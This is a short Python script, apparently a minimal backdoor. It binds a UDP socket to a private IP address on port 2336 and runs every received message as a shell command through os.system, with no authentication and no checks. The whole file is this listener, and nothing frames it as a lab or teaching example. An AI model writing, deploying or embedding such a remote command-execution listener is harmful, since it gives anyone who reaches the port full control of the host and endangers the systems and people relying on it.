#!/usr/bin/python
import socket
import os
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
ip="192.168.221.129"
s.bind((ip,2336))
while True:
	x=s.recvfrom(100)[0]
	os.system(x)






